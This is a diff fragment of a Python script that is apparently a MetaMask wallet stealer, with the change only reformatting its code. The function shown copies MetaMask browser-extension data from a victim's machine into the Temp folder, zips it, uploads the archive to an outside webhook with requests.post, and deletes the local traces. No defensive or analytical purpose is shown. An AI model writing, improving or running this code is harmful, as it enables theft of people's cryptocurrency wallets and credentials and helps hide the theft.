@@ -13,17 +13,23 @@ user = os.path.expanduser("~")
 
 def make(args, brow, count):
    try:
-    if os.path.exists(args):
-     shutil.copytree(args, user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
-     
-     print(f"New Wallet found! : Total: {count}\nWallet: MetaMask_{brow}")
+      if os.path.exists(args):
+         shutil.copytree(args, f"{user}\\AppData\\Local\\Temp\\Metamask_{brow}")
+
+         print(f"New Wallet found! : Total: {count}\nWallet: MetaMask_{brow}")
    except shutil.Error:
-       pass
-       shutil.make_archive(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}", "zip", user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
-       file = {"file": open(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip", 'rb')}
-       r = requests.post(hook, files=file)
-       os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
-       os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip")
+      shutil.make_archive(
+          f"{user}\\AppData\\Local\\Temp\\Metamask_{brow}",
+          "zip",
+          f"{user}\\AppData\\Local\\Temp\\Metamask_{brow}",
+      )
+      file = {
+          "file": open(f"{user}\\AppData\\Local\\Temp\\Metamask_{brow}.zip",
+                       'rb')
+      }
+      r = requests.post(hook, files=file)
+      os.remove(f"{user}\\AppData\\Local\\Temp\\Metamask_{brow}")
+      os.remove(f"{user}\\AppData\\Local\\Temp\\Metamask_{brow}.zip")
 def yea():
     
  meta_paths = [
